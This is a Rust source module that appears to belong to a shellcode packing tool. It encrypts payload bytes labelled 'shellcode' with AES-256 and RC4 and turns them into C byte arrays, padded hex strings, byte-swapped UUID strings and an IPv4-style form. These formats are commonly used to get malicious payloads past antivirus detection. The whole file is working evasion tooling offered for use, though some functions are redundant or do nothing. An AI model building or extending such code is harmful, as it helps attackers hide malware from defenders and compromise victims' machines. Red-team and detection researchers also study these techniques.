pub mod config;



use uuid::{Uuid};
use rand::Rng;
use libaes::Cipher;
use console::style;
use crypto::symmetriccipher::SynchronousStreamCipher;
use crypto::rc4::Rc4;
extern crate crypto;

pub fn get_len(vec: &Vec<u8>, name: &String) -> usize {
    println!("{} {} Length: {}", style("[*]").green(), name, style(vec.len()).cyan());
    vec.len()
}

pub fn rc4_encrypt(key: &[u8], plaintext: &[u8]) -> Vec<u8> {
    let mut ciphertext = vec![0; plaintext.len()];
    let mut rc4 = Rc4::new(key);
    rc4.process(plaintext, &mut ciphertext);
    ciphertext
}

pub fn aes_encrypt(shell_code_buffer: &Vec<u8>, aes_key: &[u8; 32], aes_iv: &[u8; 16]) -> Vec<u8>{

    let cipher = Cipher::new_256(&aes_key);
    let shellcode_aes_encrypt_buffer = match Some(cipher.cbc_encrypt(aes_iv, &shell_code_buffer)){
        Some(c) => c,
        None => {
            println!("{} Can't encrypt shellcode :(", style("[ERROR]").red());
                std::process::exit(1);
        }
    };
    shellcode_aes_encrypt_buffer


}
pub fn get_c_arr(arr: &mut Vec<u8>) -> String{
    let mut result = String::new();
    for byte in arr{
        result.push_str(&format!("0x{:02X}, ",byte));
    }

    result.pop();
    result.pop();
    result
}

pub fn print_c_arr(arr: &mut Vec<u8>, name: &String){
    print!("\n");
    print!("unsigned char {}[] = {}", name, "{");
    for byte in arr{
        print!("0x{:02X}, ", byte);
    }
    print!("{}","};");
    print!("\n");
}


pub fn vec_to_string(vec: &Vec<u8>) -> String{
    let mut result = String::new();
    for byte in vec{
        result.push_str(&format!("{:02x}", byte));
    }
    let remaining = 32 - vec.len() % 32;
    if remaining > 0 {
        let mut rng = rand::thread_rng();
        for _ in 0..remaining{
            let random_byte: u8 = rng.gen();
            result.push_str(&format!("{:02x}", random_byte));
        }
    }
    result
}
fn transform_uuid(input: &str) -> String {
    let result = input.replace("-", "");
    let formatted_result = format!(
        "{}{}{}{}-{}{}-{}{}-{}{}-{}",

        &result[6..8],
        &result[4..6],
        &result[2..4],
        &result[0..2],

        &result[10..12],
        &result[8..10],

        &result[14..16],
        &result[12..14],

        &result[16..18],
        &result[18..20],

        &result[20..],
    );

    formatted_result
}

pub fn uuid_encode(uuid_string: &String) -> Vec<String>{
    let uuid_vec: Vec<&str> = uuid_string.as_bytes().chunks(32)
        .map(|chunk| std::str::from_utf8(chunk).unwrap())
        .collect();
    let mut clear_vec = Vec::new();
    let mut ob_vec: Vec<String> = Vec::new();


    for uuid in uuid_vec{
     let _my_uuid = match Uuid::parse_str(uuid){
        Ok(uuid) => {
            //println!("[i] Parsed UUID: {}", uuid); 
            clear_vec.push(uuid.to_string());
        },
        Err(err) => println!("Failed to parse UUID: {}", err),
     };
    };

    for (_i,uuid) in clear_vec.iter().enumerate(){
        let mut output = String::new();
        output.push_str(&transform_uuid(&uuid.as_str()));
        output.push('-');
        output.pop();
        ob_vec.push(output);
    }
    ob_vec
}

pub fn ipv4_encode(data: Vec<u8>) -> Vec<u8> {
    let mut result = Vec::new();
    
    for byte in data {
        result.push(byte.to_string().parse().unwrap());
    }
    
    result
}

